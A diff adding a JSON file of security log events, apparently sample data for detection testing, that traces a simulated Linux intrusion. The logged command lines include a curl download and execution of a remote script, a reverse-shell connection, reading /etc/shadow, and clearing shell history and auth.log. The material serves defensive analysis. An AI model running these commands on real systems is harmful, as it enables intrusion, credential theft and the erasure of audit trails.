@@ -1,0 +1,76 @@
+{
+  "hits": [
+    {
+      "@timestamp": "2026-05-12T11:02:14.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "45.33.32.156" },
+      "user": { "name": "ubuntu" },
+      "event": { "action": "process_start", "category": "process" },
+      "process": { "name": "curl", "command_line": "curl http://45.33.32.156:8080/stage2.sh -o /tmp/.update" },
+      "message": "Suspicious download via curl from external IP"
+    },
+    {
+      "@timestamp": "2026-05-12T11:02:31.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "45.33.32.156" },
+      "user": { "name": "ubuntu" },
+      "event": { "action": "process_start", "category": "process" },
+      "process": { "name": "bash", "command_line": "bash /tmp/.update" },
+      "message": "Script executed from temp directory"
+    },
+    {
+      "@timestamp": "2026-05-12T11:02:44.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "destination": { "ip": "45.33.32.156", "port": 4444 },
+      "user": { "name": "ubuntu" },
+      "event": { "action": "network_connection", "category": "network" },
+      "message": "Outbound TCP connection to 45.33.32.156:4444 — possible reverse shell"
+    },
+    {
+      "@timestamp": "2026-05-12T11:03:01.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "user": { "name": "ubuntu" },
+      "event": { "action": "privilege_escalation", "category": "process" },
+      "process": { "name": "sudo", "command_line": "sudo su -" },
+      "message": "Privilege escalation via sudo"
+    },
+    {
+      "@timestamp": "2026-05-12T11:03:22.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "user": { "name": "root" },
+      "event": { "action": "file_created", "category": "file" },
+      "file": { "path": "/etc/cron.d/sysupdate", "name": "sysupdate" },
+      "message": "New cron job created by root: /etc/cron.d/sysupdate"
+    },
+    {
+      "@timestamp": "2026-05-12T11:03:45.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "destination": { "ip": "45.33.32.156", "port": 443 },
+      "user": { "name": "root" },
+      "event": { "action": "network_connection", "category": "network" },
+      "message": "C2 beacon: HTTPS to 45.33.32.156 (beacon interval 60s)"
+    },
+    {
+      "@timestamp": "2026-05-12T11:04:10.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "user": { "name": "root" },
+      "event": { "action": "process_start", "category": "process" },
+      "process": { "name": "cat", "command_line": "cat /etc/shadow" },
+      "message": "Credential file accessed: /etc/shadow"
+    },
+    {
+      "@timestamp": "2026-05-12T11:04:38.000Z",
+      "host": { "name": "linux-web-01" },
+      "source": { "ip": "10.0.1.5" },
+      "user": { "name": "root" },
+      "event": { "action": "log_cleared", "category": "process" },
+      "process": { "name": "bash", "command_line": "history -c && echo > /var/log/auth.log" },
+      "message": "Auth log cleared and bash history deleted"
+    }
+  ]
+}
